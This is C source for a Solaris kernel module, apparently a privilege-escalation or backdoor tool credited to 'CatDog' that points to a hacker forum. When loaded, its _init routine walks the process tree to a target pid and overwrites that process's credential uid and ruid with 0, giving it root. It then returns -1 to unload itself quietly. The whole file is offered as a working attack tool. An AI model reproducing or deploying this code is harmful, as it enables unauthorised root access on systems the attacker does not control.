/*
 Writen By CatDog
 the module find the user's proccess's cred struct
 change it's owner uid to 0(root)
 this code can work properly in any conditions

Links:
 support@catdogsoft.com
 http://www.catdogsoft.com/S8EXP/

Reference:
 jerryhj@yeah.net
 http://www.hacker.com.cn/newbbs/dispbbs.asp?boardID=8&RootID=23110&ID=23110

*/
#include <sys/systm.h>
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/kmem.h>
#include <sys/errno.h>
#include <sys/proc.h>
#include <sys/user.h>
#include <sys/thread.h>
#include <sys/cred.h>
#include <vm/as.h>
#include <vm/seg.h>
#include <vm/seg_vn.h>

typedef unsigned int DWORD;

DWORD   ptree[20]={0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xfffff
fff,
                                 0xffffffff,0xffffffff,0xffffffff,
                                 0xffffffff,0xffffffff,0xffffffff,
                                 0xffffffff,0xffffffff,0xffffffff};
/*
 * This is the loadable module wrapper.
 */
#include <sys/modctl.h>

int _info(struct modinfo *modinfop)
{
    return -1;
}

int _init(void)
{
    proc_t *current,*pp;
    pid_t rec;
    int i,cnt;

    for(i=0;ptree[i]!=0xffffffff;i++);
    cnt=i;

cmn_err(CE_NOTE ,"Get Su: cnt=%d", cnt);

    current=curproc;
    while(current->p_pidp->pid_id!=0) current=current->p_parent;

    pp=current;

    for(i=0;i<cnt;i++) {
        pp=pp->p_child;
cmn_err(CE_NOTE ,"Get Su: search pid=%d", ptree[i]);
        while(pp!=0)  {
            if(pp->p_pidp->pid_id==ptree[i])  break;
            pp=pp->p_sibling;
        }
        if(pp==0) goto ERR;
    }

    if(pp!=0) {
        pp->p_cred->cr_ruid=0;
        pp->p_cred->cr_uid=0;
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_pidp->pid_id);
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_cred->cr_ruid);
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_cred->cr_uid);
    }

ERR:
    cmn_err(CE_NOTE ,"Get Su: not found");
    return -1;
}


